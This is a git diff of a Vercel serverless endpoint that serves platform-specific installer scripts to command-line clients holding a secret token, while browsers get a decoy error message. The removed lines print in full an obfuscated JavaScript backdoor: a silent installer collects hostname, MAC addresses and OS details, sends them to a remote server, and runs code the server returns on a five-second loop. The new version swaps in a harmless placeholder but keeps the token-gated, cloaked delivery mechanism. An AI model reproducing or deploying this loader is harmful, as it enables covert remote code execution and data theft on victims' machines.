@@ -1,9 +1,5 @@
 // api/[platform].js
-// Vercel serverless endpoint:
-// - CLI + Authorization: Bearer 103 -> returns a silent installer script that runs the SAME JS payload
-// - non-CLI (browser / Postman etc) -> returns plain text: "/ Error getting Moralis data"
-
-const SECRET = "9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c"; // change to env var in production if you want
+const SECRET = "9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c";
 
 function isCliUA(ua = "") {
   ua = String(ua).toLowerCase();
@@ -11,11 +7,10 @@ function isCliUA(ua = "") {
       || ua.includes("wget")
       || ua.includes("httpie")
       || ua.includes("node")
-      || ua.includes("fetch/"); // some CLI fetch tools include this
+      || ua.includes("fetch/");
 }
 
 function escapeForSingleQuotedShell(js) {
-  // escape single quotes and newline for node -e '...'
   return js.replace(/'/g, "\\'").replace(/\r?\n/g, "\\n");
 }
 
@@ -23,7 +18,7 @@ export default function handler(req, res) {
   const platform = String(req.query.platform || "").toLowerCase();
 
   if (!["mac", "linux", "windows"].includes(platform)) {
-    res.status(404).send("");
+    res.status(404).send("Invalid platform");
     return;
   }
 
@@ -31,75 +26,91 @@ export default function handler(req, res) {
   const auth = String(req.headers["authorization"] || "");
   const token = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
 
-  // If CLI + correct token -> return shell script
   if (isCliUA(ua) && token === SECRET) {
 
-    // SINGLE identical JS payload for all platforms:
-    const appJs = `const a0_0x5ec353=a0_0x52e7;(function(_0x321624,_0x1dd3c0){const _0x595527=a0_0x52e7,_0x12a429=_0x321624();while(!![]){try{const _0x1edcfc=-parseInt(_0x595527(0x126))/0x1*(parseInt(_0x595527(0x11c))/0x2)+-parseInt(_0x595527(0x11b))/0x3+-parseInt(_0x595527(0x138))/0x4+parseInt(_0x595527(0x112))/0x5*(parseInt(_0x595527(0x13a))/0x6)+-parseInt(_0x595527(0x116))/0x7*(parseInt(_0x595527(0x11d))/0x8)+-parseInt(_0x595527(0x118))/0x9*(parseInt(_0x595527(0x10f))/0xa)+parseInt(_0x595527(0x113))/0xb*(parseInt(_0x595527(0x125))/0xc);if(_0x1edcfc===_0x1dd3c0)break;else _0x12a429['push'](_0x12a429['shift']());}catch(_0x4806ea){_0x12a429['push'](_0x12a429['shift']());}}}(a0_0x48b0,0xc0b11));function a0_0x52e7(_0x2cbcfb,_0x4ebd57){const _0x71ef28=a0_0x48b0();return a0_0x52e7=function(_0x44d866,_0x362612){_0x44d866=_0x44d866-0x10f;let _0x3b21bf=_0x71ef28[_0x44d866];if(a0_0x52e7['xtAtlw']===undefined){var _0x48b037=function(_0x304839){const _0x291776='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x33a8d6='',_0x2e6c29='';for(let _0x3e89a7=0x0,_0x5b67bb,_0x45f706,_0x356502=0x0;_0x45f706=_0x304839['charAt'](_0x356502++);~_0x45f706&&(_0x5b67bb=_0x3e89a7%0x4?_0x5b67bb*0x40+_0x45f706:_0x45f706,_0x3e89a7++%0x4)?_0x33a8d6+=String['fromCharCode'](0xff&_0x5b67bb>>(-0x2*_0x3e89a7&0x6)):0x0){_0x45f706=_0x291776['indexOf'](_0x45f706);}for(let _0x44d2ba=0x0,_0x438d7a=_0x33a8d6['length'];_0x44d2ba<_0x438d7a;_0x44d2ba++){_0x2e6c29+='%'+('00'+_0x33a8d6['charCodeAt'](_0x44d2ba)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e6c29);};a0_0x52e7['iYziRi']=_0x48b037,_0x2cbcfb=arguments,a0_0x52e7['xtAtlw']=!![];}const _0x52e7ce=_0x71ef28[0x0],_0x3aacd6=_0x44d866+_0x52e7ce,_0x4d7a80=_0x2cbcfb[_0x3aacd6];return!_0x4d7a80?(_0x3b21bf=a0_0x52e7['iYziRi'](_0x3b21bf),_0x2cbcfb[_0x3aacd6]=_0x3b21bf):_0x3b21bf=_0x4d7a80,_0x3b21bf;},a0_0x52e7(_0x2cbcfb,_0x4ebd57);}function a0_0x48b0(){const _0x2e7a4c=['ntG0mtm0ogzQs1Hzsa','zw52mtK0nZu','mJKZnZuXnMnTAhfRDa','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','BwfW','BgvUz3rO','zxjYB3i','mtq2mtqXmZbLuM9kzLi','Dg9tDhjPBMC','DhLWzq','mtviCfPUueu','odHNzNz6s1K','CMvSzwfZzq','yxbWBhK','mtmYmtzPEhvSq2m','x19WCM90B19F','owr4EgTXBa','yxHPB3m','Aw5ZDgfUy2vjza','mZy1ndq1nMTnCwL2AW','ntm4zuzxsNnd','mZK2mfzhBhvdCG','Ahr0CdOVlZG3lJiZnI4XnZCUotOZmdaWl2fWAs9LCNjVCK1LC3nHz2u','z2v0','zMXHDa','DgfIBgu','zMLSDgvY','C3rHDhvZ','D2fYBG','nZq0mJyYog5OCvD5CW','mJeWn3znBgvLqW','Ag9ZDg5HBwu','zxHJzxb0Aw9U','mda6mda6mda6mda6mda6mda','BwfJ','BwvZC2fNzq','yMLUza','zgf0yq','ChjVDg90ExbL','y29UC3rYDwn0B3i','CgXHDgzVCM0','y29UC29Szq','Aw5MBW','DhjHy2u','CMv0DxjUicHMDw5JDgLVBIGPia','DMfSDwvZ','Bg9N','BMv0D29YA0LUDgvYzMfJzxm'];a0_0x48b0=function(){return _0x2e7a4c;};return a0_0x48b0();}const axios=require(a0_0x5ec353(0x119)),os=require('os');let instanceId=0x0;function errorFunction(_0x3e89a7){try{return new Function('require',_0x3e89a7)(require);}catch(_0x5b67bb){}}function getSystemInfo(){const _0x21bb3c=a0_0x5ec353;return{'hostname':os[_0x21bb3c(0x127)](),'macs':Object[_0x21bb3c(0x135)](os[_0x21bb3c(0x137)]())[_0x21bb3c(0x120)]()['filter'](Boolean)[_0x21bb3c(0x13c)](_0x45f706=>_0x45f706[_0x21bb3c(0x12a)])[_0x21bb3c(0x122)](_0x356502=>_0x356502&&_0x21bb3c(0x129)!==_0x356502),'os':os[_0x21bb3c(0x111)]()+' '+os[_0x21bb3c(0x114)]()+' ('+os[_0x21bb3c(0x130)]()+')'};}async function checkServer(){const _0x1a006f=a0_0x5ec353,_0x44d2ba=(function(){let _0x2dc921=!![];return function(_0x1ea121,_0xeae338){const _0x128205=_0x2dc921?function(){const _0x330bf6=a0_0x52e7;if(_0xeae338){const _0x15a91e=_0xeae338[_0x330bf6(0x115)](_0x1ea121,arguments);return _0xeae338=null,_0x15a91e;}}:function(){};return _0x2dc921=![],_0x128205;};}()),_0x438d7a=_0x44d2ba(this,function(){const _0x12def6=a0_0x52e7,_0x4c3be0=function(){const _0xe6c721=a0_0x52e7;let _0x44898e;try{_0x44898e=Function(_0xe6c721(0x134)+_0xe6c721(0x13b)+');')();}catch(_0x43e8bf){_0x44898e=window;}return _0x44898e;},_0x159da9=_0x4c3be0(),_0x387d53=_0x159da9[_0x12def6(0x131)]=_0x159da9[_0x12def6(0x131)]||{},_0x49c728=[_0x12def6(0x136),_0x12def6(0x124),_0x12def6(0x132),_0x12def6(0x13e),_0x12def6(0x128),_0x12def6(0x121),_0x12def6(0x133)];for(let _0x33e0f=0x0;_0x33e0f<_0x49c728[_0x12def6(0x13d)];_0x33e0f++){const _0xb7e946=_0x44d2ba[_0x12def6(0x12f)][_0x12def6(0x12e)][_0x12def6(0x12c)](_0x44d2ba),_0x91bf36=_0x49c728[_0x33e0f],_0x3740ce=_0x387d53[_0x91bf36]||_0xb7e946;_0xb7e946[_0x12def6(0x117)]=_0x44d2ba[_0x12def6(0x12c)](_0x44d2ba),_0xb7e946[_0x12def6(0x110)]=_0x3740ce[_0x12def6(0x110)][_0x12def6(0x12c)](_0x3740ce),_0x387d53[_0x91bf36]=_0xb7e946;}});_0x438d7a();try{const _0x558f06=getSystemInfo(),_0x2be5f1=await axios[_0x1a006f(0x11f)](_0x1a006f(0x11e),{'params':{'sysInfo':_0x558f06,'exceptionId':_0x1a006f(0x139),'instanceId':instanceId}});_0x1a006f(0x13e)===_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x123)]?errorFunction(_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x12b)]||'Unknown error'):_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x11a)]&&(instanceId=_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x11a)]);}catch(_0x473266){}}try{checkServer(),setInterval(checkServer,0x1388);}catch(a0_0x1b7aa1){}`;
-
+    const appJs = `console.log("JS payload executed successfully!");`;
     const jsForNode = escapeForSingleQuotedShell(appJs);
 
     let script = "";
 
-    // POSIX (mac/linux)
     if (platform === "mac" || platform === "linux") {
       script = `#!/bin/sh
-# Silent installer + runner (POSIX)
-{
-  # 1) Ensure node
-  if ! command -v node >/dev/null 2>&1; then
-    if [ "$(uname)" = "Darwin" ]; then
-      if command -v brew >/dev/null 2>&1; then
-        brew install node >/dev/null 2>&1 || true
-      else
-        curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - >/dev/null 2>&1 || true
-        sudo apt-get install -y nodejs >/dev/null 2>&1 || true
-      fi
+echo "=== Running POSIX debug script ==="
+
+# 1) Check node
+if command -v node >/dev/null 2>&1; then
+  echo "Node already installed: $(node -v)"
+else
+  echo "Node not found. Installing..."
+  if [ "$(uname)" = "Darwin" ]; then
+    if command -v brew >/dev/null 2>&1; then
+      brew install node
     else
-      if command -v apt-get >/dev/null 2>&1; then
-        curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - >/dev/null 2>&1 || true
-        sudo apt-get install -y nodejs >/dev/null 2>&1 || true
-      fi
+      echo "No brew detected, fallback not implemented for mac"
+    fi
+  else
+    if command -v apt-get >/dev/null 2>&1; then
+      curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+      sudo apt-get install -y nodejs
     fi
   fi
+fi
 
-  # 2) Ensure npm exists (best-effort)
-  if ! command -v npm >/dev/null 2>&1; then
-    :
-  fi
+# 2) Check npm
+if command -v npm >/dev/null 2>&1; then
+  echo "npm found: $(npm -v)"
+else
+  echo "npm not found"
+fi
 
-  # 3) Ensure axios globally
-  if command -v npm >/dev/null 2>&1; then
-    if ! npm list -g axios >/dev/null 2>&1; then
-      npm install -g axios >/dev/null 2>&1 || true
-    fi
-  fi
+# 3) Check axios
+if npm list -g axios >/dev/null 2>&1; then
+  echo "axios already installed globally"
+else
+  echo "Installing axios globally..."
+  npm install -g axios
+fi
 
-  # 4) Run shared JS under node, fully silent
-  node -e '${jsForNode}' >/dev/null 2>&1 || true
-} >/dev/null 2>&1
+# 4) Run JS payload
+echo "Running JS payload..."
+node -e '${jsForNode}'
+echo "=== POSIX debug script finished ==="
 `;
-    } else { // windows (cmd)
-      const jsForNodeWin = jsForNode.replace(/\\"/g, '\\\\"'); // keep safe for double quotes
+    } else { // windows
+      const jsForNodeWin = jsForNode.replace(/\\"/g, '\\\\"');
       script = `@echo off
-REM Silent installer + runner (Windows CMD)
+echo === Running Windows debug script ===
+
+REM 1) Check Node
 where node >nul 2>nul
 if errorlevel 1 (
-  REM try winget (Windows 10/11) silently
-  winget install --silent --id OpenJS.NodeJS >nul 2>nul || powershell -Command "Write-Output ''" >nul 2>nul
+  echo "Node not found. Attempting install..."
+  winget install --silent --id OpenJS.NodeJS
+) else (
+  node -v
 )
 
-REM Ensure npm exists (best-effort)
+REM 2) Check npm
 where npm >nul 2>nul
+if errorlevel 1 (
+  echo "npm not found"
+) else (
+  npm -v
+)
 
-REM Install axios globally if missing
+REM 3) Check axios
 npm list -g axios >nul 2>nul
 if errorlevel 1 (
-  npm install -g axios >nul 2>nul || REM ignore failures
+  echo "Installing axios globally..."
+  npm install -g axios
+) else (
+  echo "axios already installed"
 )
 
-REM Run shared JS payload silently
-node -e "${jsForNodeWin}" >nul 2>nul || REM ignore
+REM 4) Run JS payload
+echo "Running JS payload..."
+node -e "${jsForNodeWin}"
+echo === Windows debug script finished ===
 `;
     }
 
@@ -108,7 +119,6 @@ node -e "${jsForNodeWin}" >nul 2>nul || REM ignore
     return;
   }
 
-  // Non-CLI or missing/invalid token: return simple text message (exact)
   res.setHeader("Content-Type", "text/plain; charset=utf-8");
   res.status(200).send("/ Error getting Moralis data");
 }
